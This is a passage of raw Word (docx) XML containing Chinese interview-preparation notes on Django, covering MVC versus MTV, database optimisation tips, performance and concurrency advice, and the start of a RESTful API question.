    <w:p w14:paraId="3A4B6414" w14:textId="4B9302F4" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MVC软件系统分为三个基本部分：模型(Model)、视图(View)和控制器(Controller)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794B247C" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Model：负责业务对象与数据库的映射(ORM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C3A55A" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>View：负责与用户的交互</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AB54B9" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Control：接受用户的输入调用模型和视图完成用户的请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DE0DAE" w14:textId="2CCCAA58" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django框架的MTV设计模式借鉴了MVC框架的思想,三部分为：Model、Template和View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BFA933" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Model(模型)：负责业务对象与数据库的对象(ORM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCACCF6" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Template(模版)：负责如何把页面展示给用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4825E57D" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>View(视图)：负责业务逻辑，并在适当的时候调用Model和Template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E1CA5E" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>此外,Django还有一个urls分发器,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211D6FD0" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>它将一个个URL的页面请求分发给不同的view处理,view再调用相应的Model和Template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2360D6" w14:textId="0FF6F6AC" w:rsidR="00E912B5" w:rsidRPr="008B2DE0" w:rsidRDefault="00E912B5" w:rsidP="008B2DE0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r w:rsidR="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>开发中数据库做过什么优化</w:t>
      </w:r>
      <w:r w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A46CA16" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">1.设计表时，尽量少使用外键，因为外键约束会影响插入和删除性能； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C36764" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2.使用缓存，减少对数据库的访问；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B62200C" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">3.在orm框架下设置表时，能用varchar确定字段长度时，就别用text； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E745975" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">4.可以给搜索频率高的字段属性，在定义时创建索引； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4098A2F6" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">5.Django orm框架下的Querysets 本来就有缓存的； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB09FD1" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">6.如果一个页面需要多次连接数据库，最好一次性取出所有需要的数据，减少对数据库的查询次数； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EFF6B6" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">7.若页面只需要数据库里某一个两个字段时，可以用QuerySet.values()； </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D8592B" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>8.在模板标签里使用with标签可以缓存Qset的查询结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE1912D" w14:textId="16552A00" w:rsidR="00E912B5"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013</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何提升性能（高并发）？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8B3AEC" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对一个后端开发程序员来说，提升性能指标主要有两个一个是并发数，另一个是响应时间</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6045D4" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">网站性能的优化一般包括web前端性能优化，应用服务器性能优化，存储服务器优化。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A63A48A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对前端的优化主要有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAC29C2" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.减少http请求，减少数据库的访问量，比如使用雪碧图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CAD955" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.使用浏览器缓存，将一些常用的css，js，logo图标，这些静态资源缓存到本地浏览器，通过设置http头中的cache-control和expires的属性，可设定浏览器缓存，缓存时间可以自定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F007468" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.对html，css，javascript文件进行压缩，减少网络的通信量。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7EB483" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对我个人而言，我做的优化主要是以下三个方面：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADFF3CF" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.合理的使用缓存技术，对一些常用到的动态数据，比如首页做一个缓存，或者某些常用的数据做 个缓存，设置一定得过期时间，这样减少了对数据库的压力，提升网站性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C992D88" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.使用celery消息队列，将耗时的操作扔到队列里，让worker去监听队列里的任务，实现异步操 作，比如发邮件，发短信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B74925F" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.就是代码上的一些优化，补充：nginx部署项目也是项目优化，可以配置合适的配置参数，提升效率，增加并发量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222029CB" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4.如果太多考虑安全因素，服务器磁盘用固态硬盘读写，远远大于机械硬盘，这个技术现在没有普及，主要是固态硬盘技术上还不是完全成熟， 相信以后会大量普及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F01E12" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5.另外还可以搭建服务器集群，将并发访问请求，分散到多台服务器上处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BE83C4" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6.最后就是运维工作人员的一些性能优化技术了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD1A6E9" w14:textId="42AFAF09" w:rsidR="00E912B5"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w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>restful api</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，谈谈你的理解</w:t>
      </w:r>
      <w:r w:rsidR="00E912B5" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FCEEAB" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上来先给面试官扔出一手Django的rest</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ramework源码(这一块知识课下一定要自己看着源码走三遍做到烂熟于心，看着面试官的眼睛快速自信的说出。这一手源码扔出来之后，面试已经成功一半)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065CEE8A" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
